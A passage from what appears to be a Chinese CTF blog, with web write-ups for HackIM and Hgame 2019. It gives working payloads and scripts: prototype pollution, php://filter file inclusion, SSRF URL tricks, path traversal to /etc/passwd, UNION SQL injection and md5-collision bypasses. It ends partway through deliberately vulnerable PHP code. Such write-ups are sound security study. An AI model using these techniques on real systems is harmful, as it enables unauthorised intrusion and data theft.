参考Angstrom CTF 2018] The Best Website Write-up (Web230)，我们可以发现中间5位虽然随机产生，但是是固定的，所以我们需要做的就是猜解前4位以及后3位。而题目给出 hint 意思是时间差应该是小于等于 60s ，然后最后三位根据一开始给出的id=5c51b9c9144f813f31a4c0e2，从a4c0e2开始+1枚举到a4c0ef，但是这道题比较坑的地方也就在这，最后题目顺序并不是从这顺推的，而是逆序枚举的，而且时间也不是整 60s ，所以还需要向前枚举。这里推荐大家使用MongoDB ObjectId ↔ Timestamp Converter方便查看时间戳 123456789101112131415161718import requestsurl = 'http://localhost:4545/getPOST?id=%s144f813f31%s' time = 0x5c51b9c9 counter = 0xa4c0e2for i in range(100): counter = hex(counter - 1)[2:] for i in range(1000000): time = hex(time - 1)[2:] nurl = url % (time, counter) res = requests.get(nurl) if 'Not found' not in res.text: print(res.text, nurl) time = int(time, 16) counter = int(counter, 16) break time = int(time, 16) 终于在id=5c51b911144f813f31a4c0df得到关键信息 12345I told you you follow the White Rabbit. http://localhost:4545/getPOST?id=5c51b98d144f813f31a4c0e1Did you actually come back ?? Go Away! http://localhost:4545/getPOST?id=5c51b952144f813f31a4c0e0Shit MR Anderson and his agents are here. Hurryup!. Pickup the landline phone to exit back to matrix! - /4f34685f64ec9b82ea014bda3274b0df/ http://localhost:4545/getPOST?id=5c51b911144f813f31a4c0df 访问/5c51b911144f813f31a4c0df得到源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667'use strict';const express = require('express');const bodyParser = require('body-parser')const cookieParser = require('cookie-parser');const path = require('path');const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;function merge(a,b){ for (var attr in b){ if(isObject(a[attr]) &amp;&amp; isObject(b[attr])){ merge(a[attr],b[attr]); } else{ a[attr] = b[attr]; } } return a } function clone(a){ return merge({},a);}// Constantsconst PORT = 8080;const HOST = '0.0.0.0';const admin = {};// Appconst app = express();app.use(bodyParser.json())app.use(cookieParser());app.use('/', express.static(path.join(__dirname, 'views')))app.post('/signup', (req, res) =&gt; { var body = JSON.parse(JSON.stringify(req.body)); var copybody = clone(body) if(copybody.name){ res.cookie('name', copybody.name).json({\"done\":\"cookie set\"}); } else{ res.json({\"error\":\"cookie not set\"}) }});app.get('/getFlag', (req, res) =&gt; { var аdmin=JSON.parse(JSON.stringify(req.cookies)) if(admin.аdmin==1){ res.send(\"hackim19{}\"); } else{ res.send(\"You are not authorized\"); }});app.listen(PORT, HOST);console.log(`Running on http://${HOST}:${PORT}`); 需要我们将const admin的admin属性设置为1，比较明显的一个 js 原型链污染，我们只需要让一个Object.prototype设置为{\"admin\":1}即可，而我们还需要一个name参数，所以我们大致可以这样构造：{\"name\": \"xxx\", \"__proto__\":{\"аdmin\":\"1\"}} 在第二个for循环中，由于__proto__是一个Object，会递归进入merge()，由于__proto__有一对key-value，所以会判断__proto__[\"admin\"]是否是Object，不是就进入else，对原型__proto__[\"admin\"]赋值为1，这就完成了原型链污染的操作。 最后访问/getFlag成功获得flag 1hackim19{Prototype_for_the_win} 国内关于原型链的文章还是比较少的，推荐一篇梅子酒师傅写的JavaScript原型链污染，写的还是不错的。","link":"/2019/02/14/Hackim-2019/"},{"title":"Hexo Template render error 解决方案","text":"前几天写 writeup ，在用hexo g的时候，碰到了Template render error的错误在这记录一下 问题描述使用hexo g的时候，碰到了Template render error的错误 人肉源代码review，并没有什么特殊的字符，也没有什么没有闭合的markdown符号啥的，而官方给的solution完全没有用，因为我把这篇文章从source/_post中移除，就完美没有错误了，排除了_config.yml的错误。 发现问题当文章中有}}时,且这两个括号未被代码块包含，解析会出问题。但是有时候解析并没有出问题，就比较奇怪，没有深究，遇到该问题的可以按照这种方法排除一下 解决方法把/包含在代码块中，如 123{% raw %} 含有双大括号的内容{% endraw %} 参考Hexo的一个小BUG(Template render error)","link":"/2019/02/27/Hexo-issue/"},{"title":"Hgame2019","text":"[TOC] Hgame 2019 Web wirteup Week 1Web谁吃了我的 flag 呜呜呜，Mki 一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗 T_T hint: 据当事人回忆，那个夜晚他正在用 vim 编写题目页面，似乎没有保存就关机睡觉去了,现在就是后悔，十分的后悔。 既然提示 vim ，那就直接下载.index.html.swp，用vim -r .index.html.swp恢复就好了，得到 12345678910111213&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;谁吃了我的flag???&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;damn...hgame2019 is coming soon, but the stupid Mki haven't finished his web-challenge...&lt;/p&gt;Press ENTER or t&lt;/br&gt;ommand to continue &lt;p&gt;fine, nothing serious, just give you flag this time...&lt;/p&gt; &lt;/br&gt; &lt;p&gt;the flag is hgame{3eek_diScl0Sure_fRom+wEbsit@} &lt;/body&gt;&lt;/html&gt; 换头大作战 想要 flag 嘛 工具: burpsuite postman hackbar 怎么用去百度，相信你可以的 一步步改包就可以了。完整包如下： 12345678910111213141516POST /week1/how/index.php HTTP/1.1Host: 120.78.184.111:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Waterfox/50.0Referer: www.bilibili.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeX-Forwarded-For: 127.0.0.1Cookie: admin=1Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 14want=%E6%83%B3 very easy web 代码审计初 ♂ 体验 1234567891011121314&lt;?phperror_reporting(0);include(\"flag.php\");if(strpos(\"vidar\",$_GET['id'])!==FALSE) die(\"&lt;p&gt;干巴爹&lt;/p&gt;\");$_GET['id'] = urldecode($_GET['id']);if($_GET['id'] === \"vidar\"){ echo $flag;}highlight_file(__FILE__);?&gt; 源码如上，比较简单，二次urlencode即可，payload: id=%2576%2569%2564%2561%2572 can u find me 为什么不问问神奇的十二姑娘和她的小伙伴呢 查看源码得到下一关地址 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;true&lt;title&gt;can u find me?&lt;/title&gt;&lt;/head&gt;&lt;body&gt;true&lt;p&gt;the gate has been hidden&lt;/p&gt;true&lt;p&gt;can you find it? xixixi&lt;/p&gt;true&lt;a href=\"f12.php\"&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 跟进，提示 1&lt;p&gt;please post password to me! I will open the gate for you!&lt;/p&gt; 查看该包可以发现有响应头 12345678910111213141516171819HTTP/1.1 200 OKServer: nginx/1.15.8Date: Sat, 02 Feb 2019 10:32:42 GMTContent-Type: text/html; charset=UTF-8Connection: closeX-Powered-By: PHP/7.2.14password: woyaoflagContent-Length: 302&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;true&lt;title&gt;can u find me?&lt;/title&gt;&lt;/head&gt;&lt;body&gt;true&lt;p&gt;yeah!you find the gate&lt;/p&gt;true&lt;p&gt;but can you find the password?&lt;/p&gt;true&lt;p&gt;please post password to me! I will open the gate for you!&lt;/p&gt; &lt;/html&gt; 传入对应的 password 之后，提示 1&lt;p&gt;right!&lt;/p&gt;&lt;a href='iamflag.php'&gt; click me to get flag&lt;/a&gt;&lt;/body&gt; 抓包访问是个 302 跳转，iamflag.php 就存在 flag 1234567891011121314151617HTTP/1.1 302 FoundServer: nginx/1.15.8Date: Sat, 02 Feb 2019 10:33:51 GMTContent-Type: text/html; charset=UTF-8Connection: closeX-Powered-By: PHP/7.2.14location: toofast.phpContent-Length: 132&lt;html&gt; &lt;head&gt;truetrue&lt;title&gt;can you find me?&lt;/title&gt;true&lt;/head&gt;true&lt;body&gt;truetrue&lt;p&gt;flag:hgame{f12_1s_aMazIng111}&lt;/p&gt;true&lt;/body&gt;&lt;/html&gt; Week 2Webeasy_php 代码审计 ♂ 第二弹 Title 提示 where is my robots ，访问 robots.txt 得到 img/index.php ，访问得到真源码 12345678&lt;?php error_reporting(0); $img = $_GET['img']; if(!isset($img)) $img = '1'; $img = str_replace('../', '', $img); include_once($img.\".php\"); highlight_file(__FILE__); 使用....//绕过../的过滤，使用php://filter/read=convert.base64-encode/resource=来读取文件内容 最终 payload:php://filter/read=convert.base64-encode/resource=....//flag 解 base64 得到： 123&lt;?php //$flag = 'hgame{You_4re_So_g0od}'; echo \"maybe_you_should_think_think\"; php trick some php tricks 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 ){ die('step 1 fail');}if( md5($str1) != md5($str2) ){ die('step 2 fail');}if( $str3 == $str4 ){ die('step 3 fail');}if ( md5($str3) !== md5($str4)){ die('step 4 fail');}if (strpos($_SERVER['QUERY_STRING'], \"H_game\") !==false) { die('step 5 fail');}if(is_numeric($str5)){ die('step 6 fail');}if ($str5&lt;9999999999){ die('step 7 fail');}if ((string)$str5&gt;0){ die('step 8 fial');}if (parse_url($url, PHP_URL_HOST) !== \"www.baidu.com\"){ die('step 9 fail');}if (parse_url($url,PHP_URL_SCHEME) !== \"http\"){ die('step 10 fail');}$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE){ die('step 11 fail');}else{ echo $output;} 使用str1=QNKCDZO&amp;str2=240610708绕过step 1中的md5弱相等 使用数组绕过step 2中的md5相等 使用.绕过对_的判断，数组绕过对数字的判断 使用http://localhost@127.0.0.1:80@www.baidu.com/admin.php绕过step 9 10的判断，得到admin.php 123456789101112131415&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') { die('only localhost can see it');}$filename = $_GET['filename']??'';if (file_exists($filename)) { echo \"sorry,you can't see it\";}else{ echo file_get_contents($filename);}highlight_file(__FILE__);?&gt; 使用filename=xxxxx/../flag.php绕过file_exists与file_get_contents函数 得到flag.php 1&lt;?php $flag = hgame{ThEr4_Ar4_s0m4_Php_Tr1cks} ?&gt; PHP Is The Best Language var_dump 了解一下 123456789101112131415161718192021222324252627282930313233&lt;?php include 'secret.php'; #echo $flag; #echo $secret; if (empty($_POST['gate']) || empty($_POST['key'])) { highlight_file(__FILE__); exit; } if (isset($_POST['door'])){ $secret = hash_hmac('sha256', $_POST['door'], $secret); } $gate = hash_hmac('sha256', $_POST['key'], $secret); if ($gate !== $_POST['gate']) { echo \"Hacker GetOut!!\"; exit; } if ((md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1) { echo \"Wow!!!\"; echo \"&lt;/br&gt;\"; echo $flag; } else { echo \"Hacker GetOut!!\"; } ?&gt; 一开始我一直在想用数组绕过对key的md5判断，可是一旦用了数组，$gate计算出来的就是NULL，因为hash_hmac('sha256', $_POST['key'], $secret);中key[]为数组，就会出现返回NULL的情况，但是这样的话，$gate就因为key[]的原因等于NULL了，而需要绕过$gate !== $_POST['gate']，就需要gate参数不存在或者为 0，然后这两种情况都绕不过一开始的empty($_POST['gate'])，因为empty(NULL)与empty(0)都是true… 后来经过一番提醒，$_POST['key']是可以爆破得到的，例如在 100 内 12345678910111213141516171819for($i=1; $i &lt; 99 ;$i++){ if ((md5($i)+1) == (md5(md5($i)))+1) { echo $i.\"\\n\"; }}12143942495053657174798398 得到这么多个数… 所以整个环节就比较清楚了，使用door[]将$secret置换为NULL，这样我们就可以在本地算出$gate的值了，然后 POST 那个值就行了。 最终用door[]=1&amp;key=98&amp;gate=34047c350a9243401fb31a261407ca367fe058a8f7e00abd10b257e89025ccdd得到 flag : hgame{Php_MayBe_Not_Safe} Baby_Spider Come to death in the ocean of mathematics together with Li4n0!Answer 30 questions correctly in a row during 40 seconds(The calculation result is subject to python3),then you can get the flag. Enjoy it~ hint1:The most basic operation of a spider is to disguise itself.hint2:Always believe only what you see with your own eyes 这题很坑很坑…做得有点生气 首先 1-10 关需要带一些普通请求头访问，否则第十关会直接返回shutdown命令，我没有用管理员直接跑，所以没关机，但是我误以为这是要求python返回值的问题，然后搞了半天发现是需要带一些请求头 然后在 11 关他会修改一个字体的 style ，比如我得到文本为(972279097)/414696815/(472238406)+769794962*(27940524)=?，但是视觉效果却是 字体 style 为 1234567891011&lt;style&gt;@font-face { font-family: Ariali; src: url('Ariali.otf'); font-weight: normal; font-style: normal;}.question-container{ font-family: Ariali; font-weight: bold;} 对应规则为 10123456789-&gt;1026943587 21-30 关又改了 style ，给question-container增加了after元素 1234&lt;style&gt;.question-container:after{ content:\"(616887126)-957226796+956719004+554270862+732380290=?\";} 所以我们就需要去计算这个 content 中的即可。 把脚本中的 token 替换为自己的 token : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import reimport requeststoken_url = 'http://111.231.140.29:10000/'solution_url = 'http://111.231.140.29:10000/solution'style_url = 'http://111.231.140.29:10000/statics/style.css'headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',}dic = '1026943587'r = requests.Session()s = r.post(token_url,data={'token':'BkqnELak3XMzcYsXPZ0DFuXSRf9DLsRW'},allow_redirects=True,headers=headers)str_text = r\"&lt;div class=\\\"question-container\\\"&gt;&lt;span&gt;.*&lt;/span&gt;&lt;/div&gt;\"for i in range(1,11): print(str(i)) # if i == 11: # rep = r.get(style_url) # print(rep.text) match = re.search(str_text,s.text) result = match.group().replace(\"&lt;div class=\\\"question-container\\\"&gt;&lt;span&gt;\",\"\") result = result.replace(\"=?&lt;/span&gt;&lt;/div&gt;\",\"\") print(result + '\\n') result = str(eval(result)) s = r.post(solution_url,data={'answer':result},headers=headers) print(s.text)for i in range(11,21): print(str(i)) # if i == 21: # rep = r.get(style_url) # print(rep.text) match = re.search(str_text,s.text) result = match.group().replace(\"&lt;div class=\\\"question-container\\\"&gt;&lt;span&gt;\",\"\") result = result.replace(\"=?&lt;/span&gt;&lt;/div&gt;\",\"\") tmp = '' for j in range(0,len(result)): if ord(result[j]) &gt; 47: tmp += dic[int(result[j])] else: tmp += result[j] result = tmp print(result + '\\n') result = str(eval(result)) s = r.post(solution_url,data={'answer':result},headers=headers) print(s.text)for i in range(21,31): print(str(i)) # if i == 21: # rep = r.get(style_url) # print(rep.text) s = r.get(style_url) match = re.search(\"content:\\\".*=?\\\"\",s.text) result = match.group().replace(\"content:\\\"\",\"\") result = result.replace(\"=?\\\"\",\"\") print(result + '\\n') result = str(eval(result)) s = r.post(solution_url,data={'answer':result},headers=headers) print(s.text) 虽然坑归坑，但是也是能理解作者想表达的反爬虫技术的技巧的想法的 Math 有趣 Math is interesting, isn’t it?update: 题中最后的^是乘方，不是 xorhint: 了解一下 tomcat、spring mvc 的目录结构和配置文件(自己搭一下就明白了hint2: 图片目录不在 web 目录下 输入答案 2 之后，进入下一题，发现是个计算… 我直接放在一旁跑 1-999，然后继续看题，查看源码我们可以发现 12345678910111213&lt;html&gt;&lt;head&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions.&lt;/p&gt;&lt;br/&gt;&lt;form action=\"/index.php\" method=\"post\"&gt; Your Answer: &lt;input type=\"text\" name=\"answer\" /&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 图片文件有些怪异，竟然是个.php后缀，尝试看看文件，发现报错 看来是个base64加密的图片名字格式，atob(\"cXVlc3Rpb24ucG5n\")得到question.png 尝试用/img/answer.png.php访问，换了一种报错 猜测是个可以任意文件读取，然后我们用../../../../../etc/passwd经过 base64 编码后加上.php访问，成功得到文件内容，于是猜解目录结构，发现经过../../之后就是根目录。 题目并没有给特别的信息，猜测是个默认目录之类的，既然放在tomcat下，而且也不给其他包名，应该就是类似$TOMCAT_HOME/webapps/ROOT这样的目录，然后加上WEB-INF/web.xml这个比较常用的默认文件来确定位置，最终在../../usr/local/tomcat发现tomcat目录 12btoa(\"../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml\")\"Li4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi93ZWIueG1s\" 得到文件内容 12345678910111213141516171819202122232425&lt;!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\" &gt;&lt;web-app&gt; &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;servlet&gt; &lt;servlet-name&gt;mathyouqu&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mathyouqu&lt;/servlet-name&gt; &lt;url-pattern&gt;*.php&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 根据classpath:application-context.xml，访问WEB-INF/classes/application-context.xml得到文件内容 12345678910&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:p=\"http://www.springframework.org/schema/p\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt;&lt;/beans&gt; 但是文件内容对我们接下来要读取的源码并没什么帮助，于是找了很多其他的配置文件都没有找到，最后想起来报错页面应该会有项目文件的名字，也就是之前的那张图： 我们可以看到包名hgame.controller，然后MathController就是控制器，对应的就是.class文件，image()对应的就是MathController这个类中的方法。这样从包名我们就可以找到文件路径了，猜测就是hgame/controller/MathController.class，因为是编译好的，所以是.class结尾，而不是.java 用JD-GUI打开即可看到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package hgame.controller;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.io.PrintStream;import java.util.Base64;import java.util.Base64.Decoder;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.stereotype.Controller;import org.springframework.ui.ModelMap;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;@Controllerpublic class MathController{ @RequestMapping(value={\"/index\"}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String index(ModelMap model, HttpSession session, HttpServletResponse response) throws IOException { Object step = session.getAttribute(\"step\"); if (step == null) { session.setAttribute(\"step\", Character.valueOf('1')); response.sendRedirect(\"/index.php\"); return null; } if (step.toString().equals(\"1\")) { model.addAttribute(\"message\", \"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?\"); } else if (step.toString().equals(\"2\")) { model.addAttribute(\"message\", \"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions.\"); } return \"math\"; } @RequestMapping(value={\"/index\"}, method={org.springframework.web.bind.annotation.RequestMethod.POST}) public void pindex(@RequestParam(\"answer\") String answer, HttpSession session, HttpServletResponse response) throws IOException { Object step = session.getAttribute(\"step\"); if (step == null) { session.setAttribute(\"step\", Character.valueOf('1')); response.sendRedirect(\"/index.php\"); } else if ((step.toString().equals(\"1\")) &amp;&amp; (answer.equals(\"2\"))) { session.setAttribute(\"step\", \"2\"); response.sendRedirect(\"/index.php\"); } } @RequestMapping(value={\"/img/{path}\"}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String image(@PathVariable(\"path\") String path, HttpServletResponse response) { path = new String(Base64.getDecoder().decode(path)); InputStream f = null; OutputStream out = null; try { f = new FileInputStream(\"/home/static/\" + path); out = response.getOutputStream(); int count = 0; byte[] buffer = new byte['���']; while ((count = f.read(buffer)) != -1) { out.write(buffer, 0, count); out.flush(); } } catch (Exception e) { e.printStackTrace(); } try { f.close(); out.close(); } catch (Exception e) { e.printStackTrace(); } return \"ok\"; } @RequestMapping(value={\"/flag\"}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String Flag(ModelMap model) { System.out.println(\"This is the last question.\"); System.out.println(\"123852^x % 612799081 = 6181254136845 % 612799081\"); System.out.println(\"The flag is hgame{x}.x is a decimal number.\"); model.addAttribute(\"flag\", \"Flag is not here.\"); return \"flag\"; }} 可以看到有个/flag的路由，我们只需要计算123852^x % 612799081 = 6181254136845 % 612799081这个就可以了，爆破得到15387368就是答案 Week 3Web神奇的 md5 flag 在根目录下(请善待学生机)hint:md5 碰撞 你自己本地去生成 3 个 md5 值一样的 sha 值不一样的 用 curl 上传 http://118.25.89.91:8080/question/login.php 访问不了 2333 看其他师傅的 wp ，首先是个源码审计 123456789101112131415161718192021222324&lt;?phpsession_start();error_reporting(0); if (@$_POST['username'] and @$_POST['password'] and @$_POST['code']) { $username = (string)$_POST['username']; $password = (string)$_POST['password']; $code = (string)$_POST['code']; if (($username == $password ) or ($username == $code) or ($password == $code)) { echo \"Your input can't be the same\"; } else if ((md5($username) === md5($password)) and (md5($password) === md5($code))){ echo \"Good\"; true header('Location: admin.php'); exit(); } else { echo \"&lt;pre&gt; Invalid password&lt;/pre&gt;\"; } }?&gt; 看来是 md5 强碰撞，这里给三个 md5 一样的图片 123456$ curl -s http://www.fishtrap.co.uk/black.jpg.coll | md5b69dd1fd1254868b6e0bb8ed9fe7ecad$ curl -s http://www.fishtrap.co.uk/brown.jpg.coll | md5b69dd1fd1254868b6e0bb8ed9fe7ecad$ curl -s http://www.fishtrap.co.uk/white.jpg.coll | md5b69dd1fd1254868b6e0bb8ed9fe7ecad 后面就是简单的命令执行了 sqli-1 sql 注入 参数是 id http://118.89.111.179:3000/ 没有任何过滤，就是处理验证码 code 有点麻烦 贴一下自己的脚本 123456789101112131415161718192021222324252627import hashlibimport requestsfrom urllib import parseimport re def md5(s): return hashlib.md5(s).hexdigest()def cal(code): for i in range(1, 9999999): if md5(str(i).encode('utf-8')).startswith(code): return iheaders = { 'Cookie': 'PHPSESSID=5vsgpoc8m9j8c66d9vfmru0uqd; path=/' }# req = requests.session()url = \"http://118.89.111.179:3000/\"rep = requests.get(url,headers=headers)match = re.search(r'=== .*&lt;br&gt;',rep.text)code = match.group().replace(\"=== \",\"\")code = code.replace(\"&lt;br&gt;\",\"\")payload = '1 union select table_name from information_schema.tables where table_schema=\\'hgame\\';#'payload = '1 union Select column_name from information_schema.columns where table_name=\\'f1l1l1l1g\\';#'payload = '1 union Select f14444444g from f1l1l1l1g;#'url = \"http://118.89.111.179:3000/?id=%s&amp;code=%s\" % (parse.quote(payload),cal(code))rep = requests.get(url,headers=headers)print(rep.text) sqli-2 sql 注入 http://118.89.111.179:3001/?id=1 我做的时候…也是访问不了… 12could not connect to the database: Connection refusedI'll tell you if SQL can be executed. 直接显示链接数据库失败，看其他师傅的 wp ，看样子是个盲注的题，然而… 基础渗透 综合利用各种漏洞来 getshell,然后找到被藏起来的 flag。 用http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=user直接读源码 User.php: 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phprequire_once('functions.php');if (!isset($_SESSION['login'])) { Header(\"Location: /login.php\"); exit();} else { echo \"&lt;div id='user-info' class='am-container'&gt;\"; echo \"&lt;div class='am-form'&gt;\"; echo \"&lt;div class='am-form-group am-form-file' id='form-file'&gt;\"; $image = get_avatar($_SESSION['user_id']); if ($image != null) { echo \"&lt;img type='button' src=data:image/png;base64,\" . $image['content'] . \" class='am-circle' id='avatar'&gt;\"; } else { echo \"&lt;div class='am-circle avatar-tmp' id='avatar'&gt;\" . md5($_SESSION['user']) . \"&lt;/div&gt;\"; }}?&gt; &lt;input type=\"file\" id=\"upfile\" onchange=\"SelectImage()\"&gt; &lt;/div&gt; &lt;button id=\"upload\" class=\"am-btn am-btn-primary am-disabled\"&gt;保 存 头 像&lt;/button&gt; &lt;/div&gt;&lt;?phpecho \"&lt;div class='user'&gt;&lt;strong&gt;用户名： &lt;/strong&gt; \" . $_SESSION['user'] . \"&lt;/div&gt;\";echo \"&lt;hr&gt;\";echo \"&lt;div class='am-form am-form-horizontal'&gt;\";echo \"&lt;strong&gt;原密码：&lt;/strong&gt; &lt;input id='oldpassword' type='password'&gt; \";echo \"&lt;br&gt;\";echo \"&lt;strong&gt;新密码：&lt;/strong&gt; &lt;input id='newpassword' type='password'&gt;\";echo \"&lt;br&gt;\";echo \"&lt;strong&gt;新密码确认：&lt;/strong&gt; &lt;input id='newpassword_again' type='password'&gt; \";echo \"&lt;br&gt;\";echo \"&lt;/div&gt;\";echo \"&lt;button onclick='NewPassword()' class='am-btn am-btn-danger'&gt;确 认 修 改&lt;/button&gt;\";echo \"&lt;/div&gt;\";echo \"&lt;/div&gt;\";echo \"&lt;/div&gt;\";echo \"&lt;script src='/js/user.js'&gt;&lt;/script&gt;\";?&gt; Functions.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227&lt;?php//ini_set(\"display_errors\", \"on\");require_once('config.php');session_start();function sql_query($sql_query){ global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;}function csrf_token(){ $token = ''; $chars = str_split('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'); for ($i = 0; $i &lt; 48; $i++) { $token = $token . $chars[random_int(0, 61)]; } $_SESSION['token'] = $token; echo \"&lt;input type='hidden' value='$token' id='token'&gt;\";}function res_to_json($res, $type){ $json['type'] = $type; $json['status'] = \"true\"; $json[\"content\"] = array(); foreach ($res as $message) { $array_tmp['user_id'] = $message['user_id']; $array_tmp['user'] = $message['user']; $array_tmp['avatar'] = get_avatar($message['user_id']) != null ? get_avatar($message['user_id'])['content'] : md5($message['user']); $array_tmp['message'] = $message['content']; $array_tmp['message_id'] = $message['message_id']; $array_tmp['time'] = $message['date']; array_push($json[\"content\"], $array_tmp); } $json[\"content\"] = $json[\"content\"]; return json_encode($json);}function judge($username, $password){ if ($username == null) { echo \"username's length error!\"; return false; } elseif (strlen($password) &lt; 6 or strlen($password) &gt; 16) { echo \"password's length error!\"; return false; } else { return true; }}function register($username, $password, $token){ if (judge($username, $password) == 1 and $token === $_SESSION['token']) { $password = md5($password); $sql_query = \"insert into `users`(`username`,`password`) VALUES ('$username','$password')\"; $res = sql_query($sql_query); if ($res) { echo 'register success!'; } else { echo 'error!'; } } else { echo \"error!\"; return false; }}function login($username, $password, $token){ if (!isset($_SESSION['login']) and $token === $_SESSION['token']) { $password = md5($password); $sql_query = \"select * from `users` where `username`='$username' and `password`='$password'\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) { $data = $res-&gt;fetch_array(); $_SESSION['user_id'] = $data['user_id']; $_SESSION['user'] = $data['username']; $_SESSION['groups'] = $data['groups']; $_SESSION['login'] = 1; setcookie('user', $_SESSION['user']); setcookie('groups', $_SESSION['groups']); } else { echo \"error!\"; return false; } } else { echo \"error!\"; return false; }}function loginout(){ if ($_GET['loginout'] === $_SESSION['token']) { session_destroy(); setcookie('groups', null); setcookie('user', null); Header(\"Location: index.php\"); }}function get_avatar($user_id){ $sql_query = \"select `avatar` from `users` where `user_id`=$user_id\"; $res = sql_query($sql_query)-&gt;fetch_row()[0]; if ($res) { return array('name' =&gt; $res, 'content' =&gt; base64_encode(file_get_contents('./img/avatar/' . $res . '.png'))); } else { return null; }}function get_new_messages(){ $start = $_GET['start'] ?? 0; $start = addslashes($start); $user_id = $_SESSION['user_id']; $sql_query = \"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) { return res_to_json($res, \"messages\"); }}function get_messages(){ $start = $_GET['start'] ?? 0; $start = addslashes($start); $user_id = $_SESSION['user_id']; $sql_query = \"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) { return res_to_json($res, \"messages\"); }}function add_message($message){ if ($_POST['token'] === $_SESSION['token']) { if (isset($_SESSION['login']) and mb_strlen($message) &gt; 6) { $user_id = $_SESSION['user_id']; $user = $_SESSION['user']; $sql_query = \"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')\"; sql_query($sql_query); } elseif (!isset($_SESSION['login'])) { echo \"login error\"; } else { echo \"length error\"; } }}function delete_message($message_id){ $user_id = $_SESSION['user_id']; if ($_POST['token'] === 